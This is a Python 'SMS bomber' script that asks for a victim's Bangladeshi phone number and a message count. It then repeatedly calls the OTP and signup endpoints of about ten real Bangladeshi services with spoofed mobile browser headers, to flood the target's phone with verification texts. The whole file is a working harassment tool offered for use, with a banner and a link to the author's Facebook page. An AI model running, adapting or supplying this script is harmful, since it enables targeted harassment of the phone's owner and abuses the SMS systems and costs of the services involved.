#---------{ ADMIN INFO }----------
# AUTHOR   :Tanjir Ahmed Sabih
# TEAM     : Amar kono team nai
#-------------------------------- 

import sys
import time
import os
import requests
import smtplib

os.system("clear")
def slw(l):
  for i in l:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.1)


def primiam():
  os.system("clear")
  logo="""\033[38;5;46m
  
 
  _______       _   _      _ _____ _____  
 |__   __|/\   | \ | |    | |_   _|  __ \ 
    | |  /  \  |  \| |    | | | | | |__) |
    | | / /\ \ | . ` |_   | | | | |  _  / 
    | |/ ____ \| |\  | |__| |_| |_| | \ \ 
    |_/_/    \_\_| \_|\____/|_____|_|  \_\
                                          

Creator :Dark Tanjir
GITHUB    : tanjirdotx
VERSION   : 00.2
PROJECT   : SMS BOMBER 
FACEBOOK  : Tanjir Ahmed
×××××××××××××××××××××××××××××××××××××××××××"""
  for i in logo:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.001)
  num=input("\n\n\033[38;5;195m[\033[38;5;46m+\033[38;5;195m] VICTIMS NUMBER : 880")
  limit=int(input("\n\033[38;5;195m[\033[38;5;46m+\033[38;5;195m] MESSAGE LIMIT : "))
  
  headers = {
      'authority': 'www.bioscopelive.com',
      'accept': '*/*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.bioscopelive.com/en/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
  }
  
  url1=f"https://www.bioscopelive.com/en/login/send-otp?phone=880{num}&operator=bd-otp"
  
  headers2 = {
      'referer': 'https://redx.com.bd/',
      'user-agent':'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  data1 = {
      'name': num,
      'phoneNumber': num,
      'service': 'redx',
  }
  
  url2="https://api.redx.com.bd/v1/user/signup"
  
  headers3 = {
      'authority': 'bikroy.com',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'bn',
      'application-name': 'web',
      'referer': 'https://bikroy.com/bn/users/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  url3= "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
  
  headers4 = {
      'authority': 'www.ieatery.com.bd',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.ieatery.com.bd/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  url4="https://www.ieatery.com.bd/otp-verify?phn=0"+num
  
  headers5 = {
      'referer': 'https://doctime.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  data2 = {
      'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
      'code': '88',
      'contact_no': '0'+num,
      'country_calling_code': '88',
  }
  
  headers6 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  data3 = {
      'mobile': '+88-0'+num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
  }
  headers7 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  data4 = {
      'mobile': '+88-0'+num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
  }
  headers8 = {
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Origin': 'https://hungrynaki.com',
      'Referer': 'https://hungrynaki.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'accept': '*/*',
      'content-type': 'application/json',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
  }
  
  data8 = {
      'operationName': 'createOtp',
      'variables': {
          'phone':""+num,
          'country': '880',
          'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
          'osVersionCode': 'Linux aarch64',
          'deviceBrand': 'Chrome',
          'deviceModel': '107',
          'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
      },
      'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
  }
  cookies9 = {
      '_ga': 'GA1.3.1671188319.1677642641',
      '_gid': 'GA1.3.407134519.1677642641',
      '_gat_UA-146796176-2': '1',
      '_fbp': 'fb.2.1677642641903.2005162471',
      '_ga_5LF4359FD3': 'GS1.1.1677642640.1.1.1677642660.0.0.0',
  }
  
  headers9 = {
      'authority': 'fundesh.com.bd',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'content-type': 'application/json; charset=UTF-8',
      'origin': 'https://fundesh.com.bd',
      'referer': 'https://fundesh.com.bd/fundesh/profile',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  params9 = {
      'service_key': '',
  }
  
  json_data9 = {
      'msisdn': ''+num,
  }
  headers10 = {
      'Accept': '*/*',
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Origin': 'https://ecourier.com.bd',
      'Referer': 'https://ecourier.com.bd/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
  }
  url10="https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0"+num
#  
  ses=0
  while limit>ses:
    sent1=requests.get(url1, headers=headers)
    if sent1.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent2=requests.post(url2, headers=headers2,data=data1)
    if sent2.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent3=requests.get(url3,headers=headers3)
    if sent3.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent4=requests.get(url4,headers=headers4)
    if sent4.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent5=requests.post('https://admin.doctime.com.bd/api/authenticate', headers=headers5, data=data2)
    if sent5.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent6=requests.post('https://api.osudpotro.com/api/v1/users/send_otp', headers=headers6, data=data3)
    if sent6.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent7=requests.post('https://api.osudpotro.com/api/v1/users/send_otp', headers=headers7, data=data4)
    if sent7.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent8=requests.post('https://api-v4-1.hungrynaki.com/graphql', headers=headers8, json=data8)
    if sent8.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent9=requests.post(
        'https://fundesh.com.bd/api/auth/generateOTP',
        params=params9,
        cookies=cookies9,
        headers=headers9,
        json=json_data9,
    )
    if sent9.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent10 = requests.get(url10,headers=headers10)
    if sent10.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
  os.system("clear")
  print(""" \033[38;5;46m


 
 
  _______       _   _      _ _____ _____  
 |__   __|/\   | \ | |    | |_   _|  __ \ 
    | |  /  \  |  \| |    | | | | | |__) |
    | | / /\ \ | . ` |_   | | | | |  _  / 
    | |/ ____ \| |\  | |__| |_| |_| | \ \ 
    |_/_/    \_\_| \_|\____/|_____|_|  \_\                                
                        
 FOLLOW MY FACEBOK ID PLZ😍🥳
""")
  os.system("xdg-open https://www.facebook.com/profile.php?id=100084382509686&mibextid=ZbWKwL")
  sys.exit()
baner= os.system("figlet -f slant DARK TANJIR")
baner = str(baner)
baner = baner.replace("0","")
logo=f""" {baner} \033[1;37m
××××××××××××××××××××××××××××××××××××××××××××
\033[1;37m❲\033[38;5;46m+\033[1;37m❳ DEVELOPER :Dark Tanjir
\033[1;37m❲\033[38;5;46m+\033[1;37m❳ GITHUB    : tanjirdotx
\033[1;37m❲\033[38;5;46m+\033[1;37m❳ VERSION   : 00.2
\033[1;37m❲\033[38;5;46m+\033[1;37m❳ PROJECT   : SMS BOMBING 
\033[1;37m❲\033[38;5;46m+\033[1;37m❳ FACEBOOK  : Tanjir Ahmed Sabih
××××××××××××××××××××××××××××××××××××××××××××"""
print(logo)
print("[01] START SMS BOMBING ")
print("[02] CONTACT ME ON FACEBOOK ")
print("××××××××××××××××××××××××××××××××××××××××××××")
usr=input("\033[38;5;195m[\033[38;5;46m+\033[38;5;195m]\033[38;5;46m YOUR CHOICE \033[38;5;195m: ")
usr=usr.replace(" ","")
if usr== "1" or usr== "01":
  primiam()
elif usr== "2" or usr== "02":
  os.system("xdg-open https://www.facebook.com/profile.php?id=100084382509686&mibextid=ZbWKwL")
  sys.exit()
else:
  print("\033[38;5;195m\n[\033[1;31m!\033[38;5;195m]\033[1;31m WRONG OPTION ENTERED..\n")
  sys.exit()